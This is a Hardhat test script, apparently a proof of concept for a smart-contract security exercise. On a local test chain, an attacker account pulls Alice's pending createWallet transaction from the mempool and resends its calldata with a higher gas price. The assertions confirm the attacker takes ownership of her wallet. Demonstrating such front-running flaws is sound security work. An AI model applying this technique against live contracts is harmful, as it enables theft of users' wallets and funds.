const { expect } = require('chai');
const { ethers } = require('hardhat');
const 
  {abi:WalletContractAbi}
 = require('../artifacts/contracts/Wallet.sol/Wallet.json');


  let owner, alice, attacker, factory;

  async function createTraders (){
    [owner, alice, attacker] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory('FactoryContract');
    factory = await Factory.connect(owner).deploy();

    }


    async function performAttack() {
      console.log("Starting attack...\n");
    
      const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('Something'));
      
      console.log("Alice creating wallet...\n");
      await factory.connect(alice).createWallet(salt);
    
      console.log("Getting transactions from mempool...\n");
      const txs = await ethers.provider.send('eth_getBlockByNumber', [
        'pending',
        true,
      ]);
    
      console.log("Finding Alice's transaction...\n");
      const tx = txs.transactions.find(
        (tx) => tx.to === factory.address.toLowerCase()
      );
    
      if (!tx) {
        console.log("Couldn't find Alice's transaction in the mempool\n");
        return;
      }
    
      console.log("Attacker sending front-running transaction...\n");
      await attacker.sendTransaction({
        to: tx.to,
        data: tx.input,
        gasPrice: ethers.BigNumber.from(tx.gasPrice).add(100),
        gasLimit: ethers.BigNumber.from(tx.gas).add(100000),
      });
    
      console.log("Mining transactions...\n");
      await ethers.provider.send('evm_mine', []);
    
      console.log("Getting wallet address...");
      const addressOfWallet = await factory.walletOwner(attacker.address);
      console.log("Wallet address:", addressOfWallet);
    
      if (addressOfWallet === ethers.constants.AddressZero) {
        console.log("Attack failed: No wallet created for attacker");
        return;
      }
    
      console.log("Getting wallet contract...\n");
      const wallet = await ethers.getContractAt(
        WalletContractAbi,
        addressOfWallet,
        attacker
      );
    

    
      console.log("Checking results...\n");
      const aliceWallet = await factory.walletOwner(alice.address);
      const walletOwner = await wallet.owner();
      const isInitialized = await wallet.initialized();
    
      console.log("Alice's wallet:", aliceWallet);
      console.log("Wallet owner:", walletOwner);
      console.log("Wallet initialized:", isInitialized);
    
      expect(aliceWallet).to.eq(ethers.constants.AddressZero);
      expect(walletOwner).to.eq(attacker.address);
      expect(isInitialized).to.eq(true);
    }

async function startAttack(){
      console.log("Creating Alice Attacker and Owner....")
      await createTraders()
      console.log("Traders created starting attack....")
      await performAttack()
}


startAttack()



